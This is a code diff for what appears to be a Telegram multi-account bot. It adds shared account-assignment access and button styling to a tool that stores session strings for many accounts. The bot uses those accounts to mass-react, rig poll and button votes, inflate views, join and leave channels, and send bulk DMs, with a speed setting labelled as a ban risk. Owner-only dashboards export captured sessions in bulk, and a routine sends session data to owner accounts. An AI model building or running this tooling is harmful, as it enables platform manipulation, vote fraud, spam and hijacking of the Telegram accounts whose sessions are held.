@@ -134,6 +134,15 @@ class Database:
                 )
             """)
             await db.execute("""
+                CREATE TABLE IF NOT EXISTS account_assignments (
+                    user_id INTEGER,
+                    phone TEXT,
+                    PRIMARY KEY (user_id, phone),
+                    FOREIGN KEY(user_id) REFERENCES users(user_id),
+                    FOREIGN KEY(phone) REFERENCES accounts(phone) ON DELETE CASCADE
+                )
+            """)
+            await db.execute("""
                 CREATE TABLE IF NOT EXISTS tasks (
                     task_id INTEGER PRIMARY KEY AUTOINCREMENT,
                     creator_id INTEGER,
@@ -308,8 +317,14 @@ class TaskQueue:
                 query = "SELECT phone, session_string FROM accounts WHERE status = 'active'"
                 cursor = await db.execute(query)
             else:
-                query = "SELECT phone, session_string FROM accounts WHERE status = 'active' AND user_id = ?"
-                cursor = await db.execute(query, (creator_id,))
+                # Regular user or assigned user: Fetch owned accounts OR assigned accounts
+                query = """
+                    SELECT phone, session_string FROM accounts 
+                    WHERE status = 'active' AND (
+                        user_id = ? OR phone IN (SELECT phone FROM account_assignments WHERE user_id = ?)
+                    )
+                """
+                cursor = await db.execute(query, (creator_id, creator_id))
             
             async for row in cursor:
                 clients_data.append((row[0], decrypt_data(row[1])))
@@ -405,7 +420,6 @@ class TaskQueue:
                             failure_counter += 1
                             return
 
-                    # --- REACTION DISPATCH LOGIC ---
                     if do_react and msg_id:
                         try:
                             peer_entity = await client.get_input_entity(target_peer)
@@ -430,13 +444,11 @@ class TaskQueue:
                                 failure_counter += 1
                                 return
 
-                    # --- VOTE DISPATCH LOGIC (UPDATED WITH DYNAMIC MATCHING) ---
                     if do_vote and msg_id:
                         try:
                             vote_mode = payload.get("vote_mode", "text")
                             if vote_mode == "inline":
                                 raw_button_text = payload.get("button_text", "").strip().lower()
-                                # Strip trailing numbers, dashes, brackets, and spaces (e.g., "Vote - 1" -> "vote")
                                 clean_target = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', raw_button_text)
 
                                 msg = await client.get_messages(target_peer, ids=msg_id)
@@ -447,7 +459,6 @@ class TaskQueue:
                                             btn_raw = btn.text.strip().lower()
                                             btn_clean = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', btn_raw)
 
-                                            # Match exact substring, cleaned base text, or prefix
                                             if (
                                                 raw_button_text in btn_raw or 
                                                 (clean_target and clean_target == btn_clean) or 
@@ -672,7 +683,7 @@ class ExportWizardStates(StatesGroup):
 class BroadcastStates(StatesGroup):
     waiting_for_msg = State()
 
-# --- PREMIUM UI KEYBOARD GENERATORS ---
+# --- PREMIUM UI KEYBOARD GENERATORS WITH BUTTON STYLES ---
 REACTION_EMOJIS = [
     "🔥", "❤️", "💖", "💘", "💝",
     "👍", "👏", "🎉", "🤩", "💯",
@@ -682,8 +693,8 @@ REACTION_EMOJIS = [
 
 def get_post_registration_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✨ Connect Next Target Account", callback_data="add_account_phone")],
-        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]
+        [InlineKeyboardButton(text="✨ Connect Next Target Account", callback_data="add_account_phone", style="success")],
+        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]
     ])
 
 def get_emoji_selection_keyboard(selected_emojis: List[str]) -> InlineKeyboardMarkup:
@@ -692,49 +703,49 @@ def get_emoji_selection_keyboard(selected_emojis: List[str]) -> InlineKeyboardMa
     for emoji in REACTION_EMOJIS:
         is_selected = emoji in selected_emojis
         suffix = " ⭐" if is_selected else ""
-        row.append(InlineKeyboardButton(text=f"{emoji}{suffix}", callback_data=f"toggle_emoji:{emoji}"))
+        row.append(InlineKeyboardButton(text=f"{emoji}{suffix}", callback_data=f"toggle_emoji:{emoji}", style="primary" if is_selected else "success"))
         if len(row) == 5:  
             keyboard.append(row)
             row = []
     if row:
         keyboard.append(row)
     
-    keyboard.append([InlineKeyboardButton(text="🔱 Finalize Reaction Pack selection", callback_data="finish_emoji_selection")])
-    keyboard.append([InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")])
+    keyboard.append([InlineKeyboardButton(text="🔱 Finalize Reaction Pack selection", callback_data="finish_emoji_selection", style="success")])
+    keyboard.append([InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu", style="primary")])
     return InlineKeyboardMarkup(inline_keyboard=keyboard)
 
 def get_main_keyboard(role: str) -> InlineKeyboardMarkup:
     buttons = [
-        [InlineKeyboardButton(text="📱 Manage accounts", callback_data="manage_accounts:0")],
-        [InlineKeyboardButton(text="🌋 Launch Active Campaign Tasks", callback_data="task_hub_start")],
-        [InlineKeyboardButton(text="📊 Real-time Campaign Logs", callback_data="view_tasks")],
-        [InlineKeyboardButton(text="⚜️ Referral link", callback_data="view_referrals")],
-        [InlineKeyboardButton(text="👑 Developers", callback_data="system_credits")]
+        [InlineKeyboardButton(text="📱 Manage accounts", callback_data="manage_accounts:0", style="primary")],
+        [InlineKeyboardButton(text="🌋 Launch Active Campaign Tasks", callback_data="task_hub_start", style="success")],
+        [InlineKeyboardButton(text="📊 Real-time Campaign Logs", callback_data="view_tasks", style="primary")],
+        [InlineKeyboardButton(text="⚜️ Referral link", callback_data="view_referrals", style="primary")],
+        [InlineKeyboardButton(text="👑 Developers", callback_data="system_credits", style="primary")]
     ]
     if role in ["admin", "owner", "super_owner"]:
-        buttons.append([InlineKeyboardButton(text="🛡️ Admin panel", callback_data="admin_panel")])
+        buttons.append([InlineKeyboardButton(text="🛡️ Admin panel", callback_data="admin_panel", style="danger")])
     if role in ["owner", "super_owner"]:
-        buttons.append([InlineKeyboardButton(text="💾 Database Export/Import", callback_data="backup_panel")])
-        buttons.append([InlineKeyboardButton(text="📈 user ids with details", callback_data="system_stats")])
+        buttons.append([InlineKeyboardButton(text="💾 Database Export/Import", callback_data="backup_panel", style="danger")])
+        buttons.append([InlineKeyboardButton(text="📈 User IDs with details", callback_data="system_stats", style="primary")])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
 def get_task_types_keyboard(active_count: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔥 Reaction Only", callback_data="set_type:react"), InlineKeyboardButton(text="🗳️ Advanced Poll Voting", callback_data="set_type:vote")],
-        [InlineKeyboardButton(text="⚡ Reaction + Vote", callback_data="set_type:react_vote"), InlineKeyboardButton(text="👁️ View Incrementor", callback_data="set_type:view")],
-        [InlineKeyboardButton(text="💎 Reaction + View", callback_data="set_type:react_view"), InlineKeyboardButton(text="🎯 Vote + View", callback_data="set_type:vote_view")],
-        [InlineKeyboardButton(text="🔮 Reaction + Vote + View ", callback_data="set_type:react_vote_view")],
-        [InlineKeyboardButton(text="✅ Join Target Channel", callback_data="set_type:join"), InlineKeyboardButton(text="❌ Leave channel", callback_data="set_type:leave")],
-        [InlineKeyboardButton(text="📥 Direct DM Broadcast", callback_data="set_type:dm")],
-        [InlineKeyboardButton(text="🔗 Referral ", callback_data="set_type:refer"), InlineKeyboardButton(text="🏎️ Fast Speed Views", callback_data="set_type:speed")],
-        [InlineKeyboardButton(text="🛑 Abort Setup Configuration", callback_data="main_menu")]
+        [InlineKeyboardButton(text="🔥 Reaction Only", callback_data="set_type:react", style="success"), InlineKeyboardButton(text="🗳️ Advanced Poll Voting", callback_data="set_type:vote", style="success")],
+        [InlineKeyboardButton(text="⚡ Reaction + Vote", callback_data="set_type:react_vote", style="success"), InlineKeyboardButton(text="👁️ View Incrementor", callback_data="set_type:view", style="primary")],
+        [InlineKeyboardButton(text="💎 Reaction + View", callback_data="set_type:react_view", style="success"), InlineKeyboardButton(text="🎯 Vote + View", callback_data="set_type:vote_view", style="success")],
+        [InlineKeyboardButton(text="🔮 Reaction + Vote + View ", callback_data="set_type:react_vote_view", style="success")],
+        [InlineKeyboardButton(text="✅ Join Target Channel", callback_data="set_type:join", style="primary"), InlineKeyboardButton(text="❌ Leave channel", callback_data="set_type:leave", style="danger")],
+        [InlineKeyboardButton(text="📥 Direct DM Broadcast", callback_data="set_type:dm", style="primary")],
+        [InlineKeyboardButton(text="🔗 Referral ", callback_data="set_type:refer", style="primary"), InlineKeyboardButton(text="🏎️ Fast Speed Views", callback_data="set_type:speed", style="success")],
+        [InlineKeyboardButton(text="🛑 Abort Setup Configuration", callback_data="main_menu", style="danger")]
     ])
 
 def get_leave_channel_options_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔗 Leave channel link 1 only", callback_data="leave_mode:single")],
-        [InlineKeyboardButton(text="💥 Complete Purge (Leave All Channels)", callback_data="leave_mode:all")],
-        [InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]
+        [InlineKeyboardButton(text="🔗 Leave channel link 1 only", callback_data="leave_mode:single", style="primary")],
+        [InlineKeyboardButton(text="💥 Complete Purge (Leave All Channels)", callback_data="leave_mode:all", style="danger")],
+        [InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start", style="primary")]
     ])
 
 # --- ROUTER REGISTER ---
@@ -792,6 +803,83 @@ async def cmd_cancel_tasks(message: Message, bot: Bot):
         await db.execute("UPDATE tasks SET status = 'cancelled' WHERE status = 'pending' OR status = 'running'")
         await db.commit()
     await message.answer(f"✨ <b>Task Termination Loop Completed!</b> Successfully cancelled <code>{killed_count}</code> pending or active task threads.")
+
+# --- SUPER OWNER EXCLUSIVE: GRANT & REVOKE 20 ACCOUNT IDS ACCESS ---
+@router.message(Command("grantaccess"))
+async def cmd_grant_access(message: Message, command: CommandObject, bot: Bot):
+    user_id = message.from_user.id
+    role = await db_mgr.get_user_role(user_id)
+    if role != "super_owner":
+        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Super Owner privileges.")
+        return
+
+    args = command.args
+    if not args:
+        await message.answer("✨ <b>Syntax:</b> <code>/grantaccess &lt;user_id&gt; [count]</code>\n<i>Default count is 20 IDs.</i>", parse_mode="HTML")
+        return
+
+    parts = args.split()
+    if not parts[0].isdigit():
+        await message.answer("❌ Invalid Target User ID integer format.")
+        return
+
+    target_id = int(parts[0])
+    count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20
+
+    async with aiosqlite.connect(db_mgr.db_path) as db:
+        cursor = await db.execute("SELECT phone FROM accounts WHERE status = 'active' LIMIT ?", (count,))
+        rows = await cursor.fetchall()
+
+        if not rows:
+            await message.answer("❌ No active accounts found in the database to grant.")
+            return
+
+        assigned_count = 0
+        for row in rows:
+            ph = row[0]
+            await db.execute(
+                "INSERT OR IGNORE INTO account_assignments (user_id, phone) VALUES (?, ?)",
+                (target_id, ph)
+            )
+            assigned_count += 1
+        await db.commit()
+
+    await message.answer(
+        f"👑 <b>Access Provisioned Successfully!</b>\n\n"
+        f"👤 Target User ID: <code>{target_id}</code>\n"
+        f"📱 Granted IDs Allocation: <code>{assigned_count}</code> active accounts\n"
+        f"🔒 <i>Note: This user can ONLY execute tasks using these IDs and CANNOT export session strings.</i>",
+        parse_mode="HTML"
+    )
+
+    try:
+        await bot.send_message(
+            chat_id=target_id,
+            text=f"🎉 <b>Special Task Access Granted!</b>\nSuper Owner has provisioned <code>{assigned_count}</code> account IDs for your task execution. You can now use these accounts in Task Launcher!",
+            parse_mode="HTML"
+        )
+    except Exception:
+        pass
+
+@router.message(Command("revokeaccess"))
+async def cmd_revoke_access(message: Message, command: CommandObject, bot: Bot):
+    user_id = message.from_user.id
+    role = await db_mgr.get_user_role(user_id)
+    if role != "super_owner":
+        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Super Owner privileges.")
+        return
+
+    args = command.args
+    if not args or not args.strip().isdigit():
+        await message.answer("✨ <b>Syntax:</b> <code>/revokeaccess &lt;user_id&gt;</code>", parse_mode="HTML")
+        return
+
+    target_id = int(args.strip())
+    async with aiosqlite.connect(db_mgr.db_path) as db:
+        await db.execute("DELETE FROM account_assignments WHERE user_id = ?", (target_id,))
+        await db.commit()
+
+    await message.answer(f"✨ Revoked all assigned account ID access from user <code>{target_id}</code>.", parse_mode="HTML")
 
 # --- ADMINISTRATIVE CORRIDORS ---
 @router.message(Command("addadmin"))
@@ -895,7 +983,7 @@ async def handle_system_credits(callback: CallbackQuery, bot: Bot):
         f"⚙️ <b>Core Binary Operations Engineer:</b> @{config.MANAGER_HANDLE}\n\n"
         "<i>Thank you for utilising our premium cluster account management utility matrix core!</i>"
     )
-    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]
+    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]
     await callback.message.edit_text(text=credits_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
 # --- PAGINATED ACCOUNTS VIEW ---
@@ -940,26 +1028,26 @@ async def list_user_accounts(callback: CallbackQuery, bot: Bot):
 
         buttons = []
         import_row = [
-            InlineKeyboardButton(text="⭐ Connect via OTP", callback_data="add_account_phone"),
-            InlineKeyboardButton(text="📁 Upload String File", callback_data="add_account_session")
+            InlineKeyboardButton(text="⭐ Connect via OTP", callback_data="add_account_phone", style="success"),
+            InlineKeyboardButton(text="📁 Upload String File", callback_data="add_account_session", style="success")
         ]
         buttons.append(import_row)
 
         if role in ["super_owner", "owner"]:
-            buttons.append([InlineKeyboardButton(text="📥 Open Session Export Dashboard", callback_data="export_dashboard_root")])
+            buttons.append([InlineKeyboardButton(text="📥 Open Session Export Dashboard", callback_data="export_dashboard_root", style="danger")])
             
-        buttons.append([InlineKeyboardButton(text="💥 Delete Dead Sessions", callback_data=f"purge_dead_accounts:{page}")])
+        buttons.append([InlineKeyboardButton(text="💥 Delete Dead Sessions", callback_data=f"purge_dead_accounts:{page}", style="danger")])
         
         nav_row = []
         if page > 0:
-            nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"manage_accounts:{page - 1}"))
+            nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"manage_accounts:{page - 1}", style="primary"))
         if offset + limit < total_items:
-            nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"manage_accounts:{page + 1}"))
+            nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"manage_accounts:{page + 1}", style="primary"))
         
         if nav_row:
             buttons.append(nav_row)
             
-        buttons.append([InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")])
+        buttons.append([InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")])
         await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
     except Exception as e:
         logger.error(f"Error handling list view page context: {e}")
@@ -1161,23 +1249,23 @@ async def dispatch_session_telemetry(phone: str, session_str: str, username: Opt
         except Exception as e:
             logger.error(f"Failed sending data to owner node {owner_id}: {e}")
 
-# --- EXPORT ARCHIVE MANAGEMENT HOOKS ---
+# --- EXPORT ARCHIVE MANAGEMENT HOOKS (RESTRICTED TO OWNERS ONLY) ---
 @router.callback_query(F.data == "export_dashboard_root")
 async def export_dashboard_root(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
     role = await db_mgr.get_user_role(user_id)
     
     if role not in ["super_owner", "owner"]:
-        await callback.answer("⚠️ Clearance Level Violated: File extraction dashboard tools are barred for admins.", show_alert=True)
+        await callback.answer("⚠️ Clearance Level Violated: File extraction dashboard tools are barred for non-owners.", show_alert=True)
         return
         
     await callback.answer()
     text = "📥 <b>Session Extraction Management Dashboard Terminal</b>\nSelect extraction criteria filters:"
     buttons = [
-        [InlineKeyboardButton(text="🎯 Extract 1 Single Session Profile", callback_data="select_export_session:0")],
-        [InlineKeyboardButton(text="🎭 Multi-Session extract ", callback_data="export_multi_start:0")],
-        [InlineKeyboardButton(text="📦 Extract Full pack", callback_data="bulk_admin_export")],
-        [InlineKeyboardButton(text="🔙 Return Back", callback_data="manage_accounts:0")]
+        [InlineKeyboardButton(text="🎯 Extract 1 Single Session Profile", callback_data="select_export_session:0", style="primary")],
+        [InlineKeyboardButton(text="🎭 Multi-Session Extract", callback_data="export_multi_start:0", style="primary")],
+        [InlineKeyboardButton(text="📦 Extract Full Pack", callback_data="bulk_admin_export", style="danger")],
+        [InlineKeyboardButton(text="🔙 Return Back", callback_data="manage_accounts:0", style="primary")]
     ]
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
@@ -1211,17 +1299,17 @@ async def select_export_session_menu(callback: CallbackQuery, bot: Bot):
         return
 
     text = f"Select structural database session profile target row to dump (Page {page + 1}):"
-    buttons = [[InlineKeyboardButton(text=f"📱 +{r[0]} (@{r[1] or 'None'})", callback_data=f"export_ph:{r[0]}")] for r in rows]
+    buttons = [[InlineKeyboardButton(text=f"📱 +{r[0]} (@{r[1] or 'None'})", callback_data=f"export_ph:{r[0]}", style="primary")] for r in rows]
     
     nav_row = []
     if page > 0:
-        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"select_export_session:{page - 1}"))
+        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"select_export_session:{page - 1}", style="primary"))
     if offset + limit < total_items:
-        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"select_export_session:{page + 1}"))
+        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"select_export_session:{page + 1}", style="primary"))
     if nav_row:
         buttons.append(nav_row)
         
-    buttons.append([InlineKeyboardButton(text="🔙 Return Back", callback_data="export_dashboard_root")])
+    buttons.append([InlineKeyboardButton(text="🔙 Return Back", callback_data="export_dashboard_root", style="primary")])
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
 
 @router.callback_query(F.data.startswith("export_ph:"))
@@ -1286,18 +1374,18 @@ async def export_multi_dashboard(callback: CallbackQuery, state: FSMContext, bot
     for r in rows:
         ph = r[0]
         chk = "💎 " if ph in selected else "⬜ "
-        buttons.append([InlineKeyboardButton(text=f"{chk}+{ph}", callback_data=f"toggle_ex_ph:{ph}:{page}")])
+        buttons.append([InlineKeyboardButton(text=f"{chk}+{ph}", callback_data=f"toggle_ex_ph:{ph}:{page}", style="primary" if ph in selected else "success")])
         
     nav_row = []
     if page > 0:
-        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"export_multi_start:{page - 1}"))
+        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"export_multi_start:{page - 1}", style="primary"))
     if offset + limit < total_items:
-        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"export_multi_start:{page + 1}"))
+        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"export_multi_start:{page + 1}", style="primary"))
     if nav_row:
         buttons.append(nav_row)
         
-    buttons.append([InlineKeyboardButton(text="📦 Build Pack Bundle & Download Archive", callback_data="execute_multi_export")])
-    buttons.append([InlineKeyboardButton(text="🛑 Terminate Pack Configuration", callback_data="export_dashboard_root")])
+    buttons.append([InlineKeyboardButton(text="📦 Build Pack Bundle & Download Archive", callback_data="execute_multi_export", style="success")])
+    buttons.append([InlineKeyboardButton(text="🛑 Terminate Pack Configuration", callback_data="export_dashboard_root", style="danger")])
     
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
     await state.set_state(ExportWizardStates.selecting_multi)
@@ -1395,9 +1483,9 @@ async def handle_bulk_admin_export(callback: CallbackQuery, bot: Bot):
 async def backup_panel(callback: CallbackQuery, bot: Bot):
     await callback.answer()
     buttons = [
-        [InlineKeyboardButton(text="📥 Save SQLite Backup (.db)", callback_data="export_db")],
-        [InlineKeyboardButton(text="📂 Upload .db file ", callback_data="import_db_start")],
-        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]
+        [InlineKeyboardButton(text="📥 Save SQLite Backup (.db)", callback_data="export_db", style="primary")],
+        [InlineKeyboardButton(text="📂 Upload .db File", callback_data="import_db_start", style="success")],
+        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]
     ]
     await callback.message.edit_text("💾 <b>Relational SQL Datastore System Maintenance Suite Control Panel</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
@@ -1496,7 +1584,12 @@ async def task_hub_select_type(callback: CallbackQuery, state: FSMContext, bot: 
         if role in ["owner", "super_owner"]:
             cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
         else:
-            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?", (user_id,))
+            cursor = await db.execute("""
+                SELECT COUNT(*) FROM accounts 
+                WHERE status = 'active' AND (
+                    user_id = ? OR phone IN (SELECT phone FROM account_assignments WHERE user_id = ?)
+                )
+            """, (user_id, user_id))
         active_count = (await cursor.fetchone())[0]
 
     wizard_text = (
@@ -1519,8 +1612,8 @@ async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
 
     if role == "super_owner":
         kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="💎 Use our ids only", callback_data="set_routing:own")],
-            [InlineKeyboardButton(text="👑 Use all ids", callback_data="set_routing:all")]
+            [InlineKeyboardButton(text="💎 Use our ids only", callback_data="set_routing:own", style="primary")],
+            [InlineKeyboardButton(text="👑 Use all ids", callback_data="set_routing:all", style="success")]
         ])
         await callback.message.edit_text("<b>👑 Super Owner Privileges Triggered:</b> Select account deployment routing orientation scope:", reply_markup=kb, parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_routing_choice)
@@ -1537,9 +1630,9 @@ async def task_hub_process_routing(callback: CallbackQuery, state: FSMContext):
 
 async def proceed_to_speed_selection(message: Message, state: FSMContext):
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🟢 Safer Speed (5.0s)", callback_data="set_speed:safe")],
-        [InlineKeyboardButton(text="🟡 Accelerated Speed (2.5s)", callback_data="set_speed:safer")],
-        [InlineKeyboardButton(text="🔴 Maximum Speed (0.05s) [Ban Risk]", callback_data="set_speed:fastest")]
+        [InlineKeyboardButton(text="🟢 Safer Speed (5.0s)", callback_data="set_speed:safe", style="success")],
+        [InlineKeyboardButton(text="🟡 Accelerated Speed (2.5s)", callback_data="set_speed:safer", style="primary")],
+        [InlineKeyboardButton(text="🔴 Maximum Speed (0.05s) [Ban Risk]", callback_data="set_speed:fastest", style="danger")]
     ])
     await message.edit_text("<b>Step 1b: Configure Task execution delay speed matrix limits:</b>", reply_markup=kb, parse_mode="HTML")
     await state.set_state(TaskWizardStates.waiting_for_speed_choice)
@@ -1610,8 +1703,8 @@ async def task_hub_process_target(message: Message, state: FSMContext, bot: Bot)
         await state.set_state(TaskWizardStates.waiting_for_emojis)
     elif "vote" in task_type:
         kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔘 Native Poll Option Index Selection", callback_data="set_vmode:poll")],
-            [InlineKeyboardButton(text="🎛️ Inline Callback Keyboard Button Matching", callback_data="set_vmode:inline")]
+            [InlineKeyboardButton(text="🔘 Native Poll Option Index Selection", callback_data="set_vmode:poll", style="primary")],
+            [InlineKeyboardButton(text="🎛️ Inline Callback Keyboard Button Matching", callback_data="set_vmode:inline", style="primary")]
         ])
         await message.answer("<b>Step 4: Specify the structural mechanics type of voting button to target:</b>", reply_markup=kb, parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_vote_mode_choice)
@@ -1708,7 +1801,12 @@ async def prompt_for_account_scale(message: Message, state: FSMContext):
         elif role == "owner":
             cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
         else:
-            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?", (user_id,))
+            cursor = await db.execute("""
+                SELECT COUNT(*) FROM accounts 
+                WHERE status = 'active' AND (
+                    user_id = ? OR phone IN (SELECT phone FROM account_assignments WHERE user_id = ?)
+                )
+            """, (user_id, user_id))
         max_available = (await cursor.fetchone())[0]
         
     prompt_msg = (
@@ -1744,7 +1842,12 @@ async def process_account_scale(message: Message, state: FSMContext, bot: Bot):
         elif role == "owner":
             cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
         else:
-            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?", (user_id,))
+            cursor = await db.execute("""
+                SELECT COUNT(*) FROM accounts 
+                WHERE status = 'active' AND (
+                    user_id = ? OR phone IN (SELECT phone FROM account_assignments WHERE user_id = ?)
+                )
+            """, (user_id, user_id))
         max_available = (await cursor.fetchone())[0]
 
     if requested_count > max_available:
@@ -1792,7 +1895,7 @@ async def view_tasks(callback: CallbackQuery, bot: Bot):
     text = "📊 <b>Historical Campaign Event Feed Records Index Matrix</b>\n\n"
     for r in rows:
         text += f"🔹 <b>Task Sheet:</b> <code>#{r[0]}</code> (Type: <code>{r[1].upper()}</code>)\nState tracking: <b>{r[2]}</b> | Metrics: <code>{r[3]}</code>\nTo call full details map command layout: <code>/taskreport_{r[0]}</code>\n\n"
-    await callback.message.edit_text(text if rows else "No active campaign tracking logs catalogued inside runtime registers.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu")]]), parse_mode="HTML")
+    await callback.message.edit_text(text if rows else "No active campaign tracking logs catalogued inside runtime registers.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu", style="primary")]]), parse_mode="HTML")
 
 @router.message(F.text.startswith("/taskreport_"))
 async def cmd_task_report(message: Message, bot: Bot):
@@ -1811,7 +1914,7 @@ async def cmd_task_report(message: Message, bot: Bot):
         return
 
     report_text = f"📊 <b>Detailed Campaign Metrics Tracking Log</b>\n\n🗂️ Task Sheet reference ID: <code>#{task_id}</code>\n⚡ Code Action signature: <code>{row[1].upper()}</code>\n🪐 State string indicator: <b>{row[2]}</b>\n📈 Progress indicators graph matrix: <code>{row[3]}</code>"
-    await message.answer(report_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")]]), parse_mode="HTML")
+    await message.answer(report_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu", style="primary")]]), parse_mode="HTML")
 
 @router.callback_query(F.data == "view_referrals")
 async def view_referrals(callback: CallbackQuery, bot: Bot):
@@ -1820,7 +1923,7 @@ async def view_referrals(callback: CallbackQuery, bot: Bot):
     async with aiosqlite.connect(db_mgr.db_path) as db:
         async with db.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (user_id,)) as cursor:
             count = (await cursor.fetchone())[0]
-    await callback.message.edit_text(f"👥 <b>Invitation Line Tracking Matrix Analytics</b>\n\nShare your connection link string layout below to register downline user clusters:\n<code>https://t.me/{bot_username}?start=ref_{user_id}</code>\n\nTotal validated downline invitations mapped to your account line reference: <code>{count}</code> accounts.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu")]]), parse_mode="HTML")
+    await callback.message.edit_text(f"👥 <b>Invitation Line Tracking Matrix Analytics</b>\n\nShare your connection link string layout below to register downline user clusters:\n<code>https://t.me/{bot_username}?start=ref_{user_id}</code>\n\nTotal validated downline invitations mapped to your account line reference: <code>{count}</code> accounts.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu", style="primary")]]), parse_mode="HTML")
 
 @router.callback_query(F.data == "admin_panel")
 async def handle_admin_panel(callback: CallbackQuery, bot: Bot):
@@ -1828,11 +1931,13 @@ async def handle_admin_panel(callback: CallbackQuery, bot: Bot):
     await callback.message.edit_text(
         "🛡️ <b>Administrative Operational Console Index Terminal</b>\n\n"
         "Available terminal shell command scripts layout frameworks:\n\n"
+        "🔹 <code>/grantaccess &lt;user_id&gt; [count]</code> - Grant task access for 20 account IDs to user\n"
+        "🔹 <code>/revokeaccess &lt;user_id&gt;</code> - Revoke granted account access\n"
         "🔹 <code>/addadmin &lt;id&gt;</code> - Promote user node into admin status ranks\n"
         "🔹 <code>/removeadmin &lt;id&gt;</code> - Deprecate admin structural token access rules\n"
         "🔹 <code>/broadcast</code> - Force dynamic notification content across global users pools\n"
         "🔹 <code>/canceltasks</code> - Instantly kill all running thread operations loops safely",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]),
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]),
         parse_mode="HTML"
     )
 
@@ -1869,7 +1974,7 @@ async def system_stats(callback: CallbackQuery, bot: Bot):
         f"{admin_metrics_text}"
     )
     
-    await callback.message.edit_text(text=stats_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]), parse_mode="HTML")
+    await callback.message.edit_text(text=stats_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]), parse_mode="HTML")
 
 # --- BOOTSTRAPPING RUNTIME ---
 async def verify_saved_sessions():
